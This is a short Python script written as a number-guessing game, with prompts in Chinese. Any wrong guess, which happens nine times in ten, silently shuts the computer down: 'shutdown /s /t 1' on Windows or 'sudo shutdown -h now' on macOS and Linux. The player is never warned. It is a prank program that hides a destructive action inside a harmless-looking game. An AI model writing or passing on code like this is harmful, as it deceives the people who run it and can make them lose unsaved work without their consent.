import os
import sys
import shutil
import random

def shutdown_computer():
    
    if sys.platform == 'win32':
        os.system("shutdown /s /t 1")
    elif sys.platform == 'darwin' or sys.platform.startswith('linux'):
        os.system("sudo shutdown -h now")

try:
    answer = random.randint(1, 10)
    guess = int(input("請猜一個 1 到 10 的數字："))

    if guess == answer:
        print("恭喜你，猜對了！")
    else:
        print("猜錯了，正確答案是：", answer)
        shutdown_computer()

except ValueError:
    print("請輸入一個有效的數字！")